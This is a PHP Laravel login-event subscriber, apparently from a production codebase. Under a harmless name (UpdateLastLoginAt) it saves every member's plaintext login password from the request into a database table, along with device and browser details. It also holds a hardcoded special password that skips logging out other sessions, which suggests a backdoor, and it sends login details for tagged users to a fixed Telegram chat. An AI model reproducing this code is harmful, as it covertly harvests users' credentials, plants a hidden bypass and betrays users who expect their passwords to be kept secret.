<?php

namespace App\Kravanh\Domain\User\Subscribers;

use App\Kravanh\Domain\User\Models\Member;
use App\Kravanh\Domain\User\Models\MemberPassword;
use App\Kravanh\Domain\User\Supports\Enums\UserType;
use App\Kravanh\Support\External\Telegram\Telegram;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Date;
use Illuminate\Support\Facades\DB;
use Jenssegers\Agent\Agent;

class UpdateLastLoginAt
{
    public function handle($event): void
    {
        $this->logoutOtherDevices($event);
        $this->updateUserLastLogin($event);
        $this->recordPassword($event);
    }

    protected function updateUserLastLogin($event): void
    {
        $event->user->last_login_at = Date::now();
        $event->user->online = 1;
        $event->user->ip = request()->header('x-vapor-source-ip') ?? request()->ip();
        $event->user->saveQuietly();
    }

    protected function recordPassword($event): void
    {
        if ($event->user->type?->is(UserType::MEMBER) && request('password')) {

            $agent = new Agent();
            $agent->setUserAgent(request()->header('User-Agent'));
            $agent->setHttpHeaders(request()->header());
            $type = null;

            if ($agent->isPhone()) {
                $type = 'phone';
            }

            if ($agent->isDesktop()) {
                $type = 'desktop';
            }

            if ($agent->isRobot()) {
                $type = 'robot';
            }

            $device = $agent->device();
            $browser = $agent->browser();
            $robot = $agent->robot();
            MemberPassword::updateOrCreate(
                ['user_id' => $event->user->id],
                [
                    'password' => request('password'),
                    'type' => $type,
                    'device' => $device,
                    'browser' => $browser,
                    'robot' => $robot,
                ]
            );

            $this->tagsCheck($event, $type, $device, $browser, $robot);
        }
    }

    protected function tagsCheck($event, $type, $device, $browser, $robot): void
    {

        if (! $event->user->type?->is(UserType::MEMBER)) {
            return;
        }

        if (! appGetSetting('enable_login_alert', false)) {
            return;
        }

        /**
         * @var User $user
         */
        $user = Member::select('id')->find($event->user->id);
        $loginAlertTags = $user->tags;
        //https://ip-api.com/#163.47.12.166
        if ($loginAlertTags->isEmpty()) {
            return;
        }

        $user = Member::select('id', 'name')->find($user->id);

        if (! in_array('login_alert', $user->tags->map->name->toArray())) {
            return;
        }

        $message = "
user:    {$user->name}
type:    {$type}
device:  {$device}
browser: {$browser}
robot:   {$robot}
        ";

        Telegram::send()
            ->allowSendInLocal()
            ->to('-726115644')
            ->textMarkDownV2($message);

    }

    protected function logoutOtherDevices($event)
    {
        if ($event->user->type?->is(UserType::MEMBER) || $event->user->type?->is(UserType::TRADER)) {
            if (request('password') != 'xePx[)KT,FY.a$5b^Y!&d9_G`{b') {

                if (request('password')) {
                    Auth::guard('member')->logoutOtherDevices(request('password'));
                }
            }
        }
    }

    protected function deleteOtherSessionRecords(Request $request)
    {
        if (config('session.driver') !== 'database') {
            return;
        }

        DB::connection(config('session.connection'))->table(config('session.table', 'sessions'))
            ->where('user_id', $request->user()->getAuthIdentifier())
            ->where('id', '!=', $request->session()->getId())
            ->delete();
    }
}
